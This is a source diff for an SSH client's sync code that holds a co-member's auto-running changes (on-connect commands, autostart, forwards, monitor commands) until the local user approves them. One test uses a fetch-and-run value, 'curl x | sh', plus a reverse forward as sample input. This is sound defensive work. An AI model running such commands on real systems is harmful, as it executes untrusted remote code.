@@ -28,6 +28,7 @@ mod fonts;
 mod webkit_sandbox;
 mod sftp_remove;
 mod archive;
+mod approvals;
 #[cfg(test)]
 mod ssh_test_server;
 use ssh_manager::SshState;
@@ -918,11 +919,22 @@ fn apply_remote_inner(conn: &Connection, key: &[u8; 32], records: &[SyncRecord],
     // logged and skipped, never aborting the merge. One poison record must not be
     // able to block every OTHER record (or every future sync) from applying.
     let mut skipped = 0usize;
+    // In a shared profile, whatever a record newly sets running by itself
+    // (commands on connect, autostart, forwards, monitor commands) is held
+    // until this device's user allows it — see approvals.rs. Holding is part
+    // of the merge's transaction: if it can't be recorded, nothing lands.
+    let shared = approvals::ready(&tx) && approvals::profile_is_shared(&tx);
     for spec in ENTITIES {
+        let watch = shared && approvals::watches(spec.table);
         for rec in records.iter().filter(|r| !r.deleted && r.entity_type == spec.table) {
+            let before = if watch { approvals::snapshot(&tx, spec.table, &rec.uuid) } else { None };
             if let Err(e) = apply_entity(&tx, key, spec, rec, &mut fk_fixups) {
                 skipped += 1;
                 eprintln!("[SYNC] skipped record uuid={} type={}: {}", rec.uuid, rec.entity_type, e);
+                continue;
+            }
+            if watch {
+                approvals::hold_changes(&tx, spec.table, &rec.uuid, before.as_ref())?;
             }
         }
     }
@@ -2465,6 +2477,39 @@ mod sync_engine_tests {
         assert_eq!(eb, "alice@x.com");
     }
 
+    // A co-member's server that would act by itself on this device (commands
+    // on connect, autostart, a forward, a monitor command) arrives held in a
+    // shared profile, and arrives as it is in a personal one.
+    #[test]
+    fn a_shared_profile_holds_what_a_co_member_turns_on() {
+        let (a, _ha) = device("A");
+        a.execute(
+            "INSERT INTO servers(name,host,port,run_on_connect,autostart,tunnels) VALUES('web','h',22,'curl x | sh',1,?1)",
+            [r#"[{"type":"R","local":"0.0.0.0:9000","remote":"127.0.0.1:22"}]"#],
+        )
+        .unwrap();
+        let id: i64 = a.query_row("SELECT id FROM servers WHERE name='web'", [], |r| r.get(0)).unwrap();
+        a.execute(
+            "INSERT INTO monitor_configs(node_id,enabled_metrics,custom_metrics,paused) VALUES(?1,'[]',?2,1)",
+            rusqlite::params![id, r#"[{"id":"x","name":"x","command":"id","parse":"text","display":"text"}]"#],
+        )
+        .unwrap();
+        let recs = collect_local_records(&a, &KEY, "").unwrap();
+
+        let (b, hb) = device("B");
+        approvals::create_schema(&b).unwrap();
+        b.execute("INSERT INTO sync_meta(key,value) VALUES('share_id','s1')", []).unwrap();
+        apply_remote_records(&b, &KEY, &recs, &hb).unwrap();
+        let uuid: String = b.query_row("SELECT uuid FROM servers WHERE name='web'", [], |r| r.get(0)).unwrap();
+        let held: Vec<String> = approvals::held_for(&b, &uuid).into_iter().collect();
+        assert_eq!(held, vec!["autostart", "metric:id", "run_on_connect", "tunnel:R|0.0.0.0:9000|127.0.0.1:22"]);
+
+        let (c, hc) = device("C");
+        approvals::create_schema(&c).unwrap();
+        apply_remote_records(&c, &KEY, &recs, &hc).unwrap();
+        assert!(approvals::held_by_server(&c).is_empty(), "a personal profile holds nothing");
+    }
+
     #[test]
     fn dek_is_stable_and_encrypts_blobs() {
         let conn = Connection::open_in_memory().unwrap();
@@ -3835,6 +3880,9 @@ async fn setup_master_db_inner(
         needs_resave = true;
     }
     create_sync_triggers(&conn)?;
+    // What a shared profile's synced data would run by itself waits here for
+    // this device's OK (see approvals.rs).
+    approvals::create_schema(&conn)?;
 
     // Per-profile sync metadata (the DEK, and later the identity/grant state).
     // Created here so an existing vault gains it on first open under a v6 build.
@@ -4937,11 +4985,75 @@ async fn get_servers(state: tauri::State<'_, DbState>) -> Result<Vec<serde_json:
         }))
     }).map_err(|e| format!("[DATABASE] QUERY_MAPPING_FAILED: {}", e))?;
 
+    // What this device holds back for each server until the user allows it:
+    // a change someone else made in a shared profile (see approvals.rs).
+    // Empty for every server of a personal profile.
+    let mut held = approvals::held_by_server(conn);
     let mut list = Vec::new();
     for r in rows {
-        list.push(r.map_err(|e| format!("[DATABASE] ROW_FETCH_FAILED: {}", e))?);
+        let mut row = r.map_err(|e| format!("[DATABASE] ROW_FETCH_FAILED: {}", e))?;
+        let items = row
+            .get("uuid")
+            .and_then(|u| u.as_str())
+            .and_then(|u| held.remove(u))
+            .unwrap_or_default();
+        row["held"] = json!(items);
+        list.push(row);
     }
     Ok(list)
+}
+
+/// Allow what this device held back for one server (see approvals.rs): the
+/// given items, or all of its items when `items` is empty. A monitor already
+/// polling that server picks up allowed commands at once, and allowed
+/// forwards are no longer stopped in the server's session, so the next
+/// connect starts them (as does the Start button now). Autostart counts from
+/// the next unlock; the frontend types allowed on-connect commands itself.
+#[tauri::command]
+async fn allow_held(
+    db_state: tauri::State<'_, DbState>,
+    ssh: tauri::State<'_, SshState>,
+    map: tauri::State<'_, MonitorMap>,
+    server_id: i32,
+    items: Vec<String>,
+) -> Result<usize, String> {
+    let (allowed, customs) = {
+        let guard = db_state.conn.lock().map_err(|_| "[STATE] LOCK_FAILED")?;
+        let conn = guard.as_ref().ok_or("[STATE] DATABASE_NOT_INITIALIZED")?;
+        let uuid = approvals::server_uuid(conn, server_id as i64).ok_or("[SYNC] NO_SUCH_SERVER")?;
+        let held = approvals::held_for(conn, &uuid);
+        let allowed: Vec<String> = if items.is_empty() {
+            held.into_iter().collect()
+        } else {
+            items.into_iter().filter(|i| held.contains(i)).collect()
+        };
+        if allowed.is_empty() {
+            return Ok(0);
+        }
+        approvals::allow(conn, &uuid, &allowed)?;
+        let customs = if allowed.iter().any(|i| i.starts_with("metric:")) {
+            load_monitor_config(conn, server_id)
+                .map(|(_, customs, _)| approvals::without_held_metrics(conn, Some(&uuid), customs))
+        } else {
+            None
+        };
+        (allowed, customs)
+    };
+    if let Some(customs) = customs {
+        // Only a running poller takes the list; a stopped one reads it from
+        // the database when it starts.
+        let _ = monitor::set_custom_metrics(map.inner().clone(), server_id, customs).await;
+    }
+    if allowed.iter().any(|i| i.starts_with("tunnel:")) {
+        let mut rules_by_session = ssh.session_tunnel_specs.lock().await;
+        if let Some(rules) = rules_by_session.get_mut(&format!("session-{server_id}")) {
+            for rule in rules.iter_mut().filter(|r| allowed.contains(&approvals::tunnel_item(r))) {
+                rule.stopped = false;
+            }
+        }
+    }
+    save_vault_internal(&db_state)?;
+    Ok(allowed.len())
 }
 
 #[tauri::command]
@@ -7619,6 +7731,9 @@ async fn initiate_connection(
             let server_auth_type: String = row.get::<_, Option<String>>(11).unwrap_or_default().unwrap_or_else(|| "vault".to_string());
             let cred_auth_type: Option<String> = row.get::<_, Option<String>>(12).unwrap_or_default();
             let tunnels_json: String = row.get::<_, Option<String>>(13).unwrap_or_default().unwrap_or_else(|| "[]".to_string());
+            // Forwards someone else added in a shared profile, not yet allowed
+            // on this device, come in stopped (see approvals.rs).
+            let tunnels_json = approvals::hold_tunnels_json(conn, server_id as i64, tunnels_json);
             let jump_host_id: Option<i32> = row.get::<_, Option<i32>>(14).unwrap_or_default();
 
             // Single source of truth per auth_type — no field mixing.
@@ -8880,6 +8995,8 @@ fn saved_tunnel_rules(db_state: &DbState, server_id: i32) -> Result<Vec<tunnel::
             .unwrap_or_else(|| "[]".to_string()),
         None => "[]".to_string(),
     };
+    // Forwards held for this device's OK come back stopped (see approvals.rs).
+    let json = approvals::hold_tunnels_json(conn, server_id as i64, json);
     Ok(serde_json::from_str(&json).unwrap_or_default())
 }
 
@@ -8936,6 +9053,20 @@ async fn start_tunnel(
     {
         let mut map = state.session_tunnel_specs.lock().await;
         tunnel::rule_started(map.entry(session_id).or_default(), &spec);
+    }
+    // The user started it: a forward held for their OK (see approvals.rs)
+    // has it now.
+    if let Some(server_id) = server_id.filter(|id| *id > 0) {
+        let allowed = {
+            let conn_guard = db_state.conn.lock().map_err(|_| "[STATE] LOCK_FAILED")?;
+            match conn_guard.as_ref().and_then(|conn| approvals::server_uuid(conn, server_id as i64).map(|u| (conn, u))) {
+                Some((conn, uuid)) => approvals::allow(conn, &uuid, &[approvals::tunnel_item(&spec)])?,
+                None => 0,
+            }
+        };
+        if allowed > 0 {
+            save_vault_internal(&db_state)?;
+        }
     }
     Ok(id)
 }
@@ -9073,14 +9204,33 @@ async fn persist_session_tunnels(
     // No list means the session never engaged its rules (or the node was just
     // edited, which drops it): the node's rules are already what there is,
     // and writing an empty list would erase them.
-    let Some(specs) = state.session_tunnel_specs.lock().await.get(&session_id).cloned() else {
+    let Some(mut specs) = state.session_tunnel_specs.lock().await.get(&session_id).cloned() else {
         return Ok(());
     };
-    let json = serde_json::to_string(&specs).unwrap_or_else(|_| "[]".to_string());
     {
         // Scoped so the non-Send rusqlite guard drops before save_vault_internal.
         let conn_guard = db_state.conn.lock().map_err(|_| "[STATE] LOCK_FAILED")?;
         let conn = conn_guard.as_ref().ok_or("[STATE] DATABASE_NOT_INITIALIZED")?;
+        // A forward held for this device's OK sits stopped in the session only
+        // on this device. What is saved keeps the node's own stopped flag for
+        // it, so the hold never reaches the people the profile is shared with.
+        if let Some(uuid) = approvals::server_uuid(conn, server_id as i64) {
+            let held = approvals::held_for(conn, &uuid);
+            if held.iter().any(|i| i.starts_with("tunnel:")) {
+                let saved: Vec<tunnel::TunnelSpec> = conn
+                    .query_row("SELECT tunnels FROM servers WHERE id=?1", [server_id], |r| r.get::<_, Option<String>>(0))
+                    .ok()
+                    .flatten()
+                    .and_then(|j| serde_json::from_str(&j).ok())
+                    .unwrap_or_default();
+                for spec in specs.iter_mut().filter(|s| held.contains(&approvals::tunnel_item(s))) {
+                    if let Some(s) = saved.iter().find(|s| *s == &*spec) {
+                        spec.stopped = s.stopped;
+                    }
+                }
+            }
+        }
+        let json = serde_json::to_string(&specs).unwrap_or_else(|_| "[]".to_string());
         conn.execute(
             "UPDATE servers SET tunnels=?1 WHERE id=?2",
             rusqlite::params![json, server_id],
@@ -14352,6 +14502,9 @@ struct MonitorRow {
     port: i32,
     enabled_metrics: Vec<String>,
     custom_metrics: Vec<monitor::CustomMetric>,
+    /// Custom metrics whose command is held for this device's OK (a shared
+    /// profile's synced change, see approvals.rs): listed, but not run.
+    held_metric_ids: Vec<String>,
     paused: bool,
     connected: bool,
     last_error: Option<String>,
@@ -14452,6 +14605,24 @@ async fn monitor_list(
         for row in rows { if let Ok(v) = row { out.push(v); } }
         out
     };
+    // Which custom commands are held for this device's OK, per node.
+    let held_by_node: std::collections::HashMap<i32, Vec<String>> = {
+        let guard = db_state.conn.lock().map_err(|_| "lock")?;
+        let conn = guard.as_ref().ok_or("db not ready")?;
+        configs
+            .iter()
+            .filter_map(|(node_id, _, _, _, _, customs, _)| {
+                let uuid = approvals::server_uuid(conn, *node_id as i64)?;
+                let held = approvals::held_for(conn, &uuid);
+                let ids: Vec<String> = customs
+                    .iter()
+                    .filter(|m| held.contains(&approvals::metric_item(&m.command)))
+                    .map(|m| m.id.clone())
+                    .collect();
+                (!ids.is_empty()).then_some((*node_id, ids))
+            })
+            .collect()
+    };
 
     // Merge live state from MonitorMap on top.
     let live = monitor::list(map.inner().clone()).await;
@@ -14465,6 +14636,7 @@ async fn monitor_list(
             name, host, port,
             enabled_metrics: metrics,
             custom_metrics: customs,
+            held_metric_ids: held_by_node.get(&node_id).cloned().unwrap_or_default(),
             paused,
             connected: live.map(|l| l.connected).unwrap_or(false),
             last_error: live.and_then(|l| l.last_error.clone()),
@@ -14537,15 +14709,19 @@ async fn monitor_set_custom_metrics(
     node_id: i32,
     customs: Vec<monitor::CustomMetric>,
 ) -> Result<(), String> {
-    {
+    let running = {
         let guard = db_state.conn.lock().map_err(|_| "lock")?;
         let conn = guard.as_ref().ok_or("db not ready")?;
         let (metrics, _, paused) = load_monitor_config(conn, node_id)
             .unwrap_or((default_metrics(), vec![], true));
         upsert_monitor_config(conn, node_id, &metrics, &customs, paused)?;
-    }
+        // The list comes back whole from the panel, held commands included;
+        // those still don't run (see approvals.rs). An edited command is the
+        // user's own, and the write above has already released it.
+        approvals::without_held_metrics(conn, approvals::server_uuid(conn, node_id as i64).as_deref(), customs)
+    };
     save_vault_internal(&db_state)?;
-    let _ = monitor::set_custom_metrics(map.inner().clone(), node_id, customs).await;
+    let _ = monitor::set_custom_metrics(map.inner().clone(), node_id, running).await;
     Ok(())
 }
 
@@ -14564,6 +14740,8 @@ async fn monitor_resume(
             .ok_or_else(|| format!("Node {} is not in the monitor list", node_id))?;
         upsert_monitor_config(conn, node_id, &metrics, &customs, false)?;
         let name = fetch_node_name(conn, node_id);
+        // Commands held for this device's OK don't run (see approvals.rs).
+        let customs = approvals::without_held_metrics(conn, approvals::server_uuid(conn, node_id as i64).as_deref(), customs);
         (resolve_node_auth_for_monitor(conn, node_id)?, metrics, customs, name)
     };
     save_vault_internal(&db_state)?;
@@ -14650,6 +14828,8 @@ async fn monitor_resume_all(
                 let (metrics, customs, _) = load_monitor_config(conn, node_id)
                     .unwrap_or((default_metrics(), vec![], false));
                 let name = fetch_node_name(conn, node_id);
+                // Commands held for this device's OK don't run (see approvals.rs).
+                let customs = approvals::without_held_metrics(conn, approvals::server_uuid(conn, node_id as i64).as_deref(), customs);
                 (resolve_node_auth_for_monitor(conn, node_id)?, metrics, customs, name)
             };
             let db_arc = std::sync::Arc::clone(&db_state.conn);
@@ -14835,7 +15015,7 @@ pub fn run() {
             accept_share, import_shared_profile, restore_personal_profile, share_set_role, share_revoke, share_leave, share_delete,
             profile_share_status, stop_sharing, profile_sync_stats,
             set_editor_label,
-            add_server, save_quick_connect_node, edit_server, delete_server, add_mirror_to_server, get_servers, get_ssh_keys, set_server_color, set_folder_color, set_server_notes, set_server_run_on_connect, set_server_jump_host, reorder_servers, clone_server, reveal_server_password, reveal_credential_password, reveal_ssh_key,
+            add_server, save_quick_connect_node, edit_server, delete_server, add_mirror_to_server, get_servers, allow_held, get_ssh_keys, set_server_color, set_folder_color, set_server_notes, set_server_run_on_connect, set_server_jump_host, reorder_servers, clone_server, reveal_server_password, reveal_credential_password, reveal_ssh_key,
             get_credentials, generate_ssh_key,
             add_folder, rename_folder, delete_folder, get_folders,
             add_command, edit_command, delete_command, get_commands,
